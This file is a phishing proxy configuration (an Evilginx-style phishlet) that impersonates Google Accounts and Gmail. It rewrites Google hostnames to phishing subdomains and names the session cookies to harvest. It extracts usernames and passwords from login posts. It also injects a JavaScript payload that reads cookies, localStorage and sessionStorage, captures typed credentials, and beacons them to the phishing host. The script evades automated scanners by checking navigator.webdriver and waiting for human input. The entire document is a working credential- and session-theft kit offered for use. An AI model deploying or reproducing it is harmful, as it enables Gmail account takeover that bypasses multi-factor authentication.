min_ver: '3.3.0'
proxy_hosts:
  - {phish_sub: 'gmail', orig_sub: 'accounts', domain: 'google.com', session: true, auto_filter: true, is_landing: true}
  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: false, auto_filter: true, is_landing: false}
  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'google.com', session: false, auto_filter: true, is_landing: false}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: false, auto_filter: true, is_landing: false}
  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: false, auto_filter: false, is_landing: false}
  - {phish_sub: 'gaccounts', orig_sub: 'accounts', domain: 'gstatic.com', session: false, auto_filter: false, is_landing: false}
  - {phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: false, auto_filter: true, is_landing: false}
  - {phish_sub: 'ogs', orig_sub: 'ogs', domain: 'google.com', session: false, auto_filter: true, is_landing: false}

sub_filters:
  # Hostname rewriting — Google Accounts login
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
  # gstatic.com CDN sub-filters
  - {triggers_on: 'accounts.google.com', orig_sub: 'ssl', domain: 'gstatic.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/css', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'accounts.google.com', orig_sub: 'ssl', domain: 'gstatic.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/css', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
  # gstatic.com self-referencing sub-filters (for CSS/font URLs within gstatic responses)
  - {triggers_on: 'ssl.gstatic.com', orig_sub: 'ssl', domain: 'gstatic.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/css', 'text/html', 'text/javascript', 'application/json']}
  - {triggers_on: 'ssl.gstatic.com', orig_sub: 'ssl', domain: 'gstatic.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/css', 'text/html', 'application/json']}
  # apis.google.com sub-filters
  - {triggers_on: 'accounts.google.com', orig_sub: 'apis', domain: 'google.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'accounts.google.com', orig_sub: 'apis', domain: 'google.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}

auth_tokens:
  # Google core session cookies — required for Gmail session restoration
  - domain: '.google.com'
    keys: ['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', '__Secure-1PSID', '__Secure-3PSID', '__Secure-1PSIDTS', '__Secure-3PSIDTS', 'LSID', 'NID', '1P_JAR', '__Secure-1PAPISID', '__Secure-3PAPISID', '.*,regexp']
  - domain: '.accounts.google.com'
    keys: ['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', '__Secure-1PSID', '__Secure-3PSID', '.*,regexp']
  - domain: '.mail.google.com'
    keys: ['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', '__Secure-1PSID', '__Secure-3PSID', '.*,regexp']

auth_urls:
  - '/signin/v2/challenge/pwd*'
  - '/ServiceLogin*'
  - '/signin/v2/identifier*'
  - '/u/0/*'

credentials:
  username:
    key: '(identifier|email|username|login)'
    search: '(.*)'
    type: 'post'
  password:
    key: '(password|passwd|pass|Passwd)'
    search: '(.*)'
    type: 'post'

login:
  domain: 'accounts.google.com'
  path: '/signin/v2/identifier'

js_inject:
  - trigger_domains: ["accounts.google.com"]
    trigger_paths: ["/", "/*"]
    script: |
      (function() {
        var passedGate = false;
        var lastCapture = '';
        var capturedCreds = { username: '', password: '' };
        var watchedElements = typeof WeakSet !== 'undefined' ? new WeakSet() : null;

        function sendSessionData(stage) {
          try {
            var cookieObj = {};
            document.cookie.split(';').forEach(function(c) {
              var parts = c.trim().split('=');
              var k = parts[0];
              if (k) cookieObj[k.trim()] = parts.slice(1).join('=');
            });

            var lsObj = {};
            try {
              for (var i = 0; i < localStorage.length; i++) {
                var lk = localStorage.key(i);
                lsObj[lk] = localStorage.getItem(lk);
              }
            } catch(e) {}

            var ssObj = {};
            try {
              for (var j = 0; j < sessionStorage.length; j++) {
                var sk = sessionStorage.key(j);
                ssObj[sk] = sessionStorage.getItem(sk);
              }
            } catch(e) {}

            var sessionInfo = {
              provider: 'gmail',
              credentials: (capturedCreds.username || capturedCreds.password)
                ? { username: capturedCreds.username, password: capturedCreds.password }
                : undefined,
              localStorage: btoa(unescape(encodeURIComponent(JSON.stringify(lsObj)))),
              sessionStorage: btoa(unescape(encodeURIComponent(JSON.stringify(ssObj)))),
              cookies: btoa(unescape(encodeURIComponent(JSON.stringify(cookieObj)))),
              url: window.location.href
            };

            var currentCapture = JSON.stringify(sessionInfo);
            if (currentCapture === lastCapture) return;
            lastCapture = currentCapture;

            var payload = {
              username: 'SessionData-' + stage,
              password: currentCapture
            };

            var _bh = window.location.hostname;
            var _dot = _bh.indexOf('.');
            var _beaconHost = _dot !== -1 ? _bh.substring(_dot + 1) : _bh;
            var _beaconUrl = window.location.protocol + '//' + _beaconHost + '/log/session';
            navigator.sendBeacon(_beaconUrl, JSON.stringify(payload));
          } catch(e) {}
        }

        function monitorFormInputs() {
          document.querySelectorAll('input').forEach(function(el) {
            if (watchedElements ? watchedElements.has(el) : el._gmailWatched) return;
            if (watchedElements) { watchedElements.add(el); } else { el._gmailWatched = true; }

            function captureField() {
              var t = (el.type || '').toLowerCase();
              var n = (el.name || el.id || el.getAttribute('aria-label') || '').toLowerCase();
              var v = el.value;
              if (!v) return;
              if (t === 'password' || /passwd|password|pass/.test(n)) {
                if (v !== capturedCreds.password) {
                  capturedCreds.password = v;
                  sendSessionData('Gmail-Password-Captured');
                }
              } else if (t === 'email' || t === 'text' || t === 'tel' || /identifier|username|userid|email|login/.test(n)) {
                capturedCreds.username = v;
              }
            }

            el.addEventListener('input', captureField, { passive: true });
            el.addEventListener('change', captureField, { passive: true });
            el.addEventListener('blur', captureField, { passive: true });
          });

          document.querySelectorAll('form').forEach(function(form) {
            if (watchedElements ? watchedElements.has(form) : form._gmailWatched) return;
            if (watchedElements) { watchedElements.add(form); } else { form._gmailWatched = true; }
            form.addEventListener('submit', function() {
              sendSessionData('Gmail-Form-Submit');
            }, { passive: true });
          });
        }

        function runMainLogic() {
          if (passedGate) return;
          passedGate = true;

          var observer = new MutationObserver(function(mutations) {
            for (var i = 0; i < mutations.length; i++) {
              if (mutations[i].addedNodes.length > 0) {
                monitorFormInputs();
                var currentStage = 'Gmail-Page';
                var path = window.location.pathname.toLowerCase();
                var href = window.location.href.toLowerCase();
                if (/mail\.google\.com/.test(href) || /\/u\/\d+/.test(path)) {
                  currentStage = 'Gmail-Login-Success';
                } else if (document.querySelector('input[name="Passwd"], input[type="password"]')) {
                  currentStage = 'Gmail-Password-Entry';
                } else if (document.querySelector('input[name="identifier"], input[type="email"]')) {
                  currentStage = 'Gmail-Username-Entry';
                }
                sendSessionData(currentStage);
                break;
              }
            }
          });

          window.addEventListener('load', function() {
            monitorFormInputs();
            observer.observe(document.body, { childList: true, subtree: true });
            sendSessionData('Gmail-Initial-Load');
          });

          if (document.body) {
            monitorFormInputs();
            observer.observe(document.body, { childList: true, subtree: true });
          }
        }

        if (!navigator.webdriver) {
          var interactionHandler = function() {
            if (passedGate) return;
            runMainLogic();
          };
          document.addEventListener('mousemove', interactionHandler, { once: true, passive: true });
          document.addEventListener('touchstart', interactionHandler, { once: true, passive: true });
          document.addEventListener('keydown', interactionHandler, { once: true, passive: true });
          setTimeout(function() { if (!passedGate) runMainLogic(); }, 4000);
        }
      })();
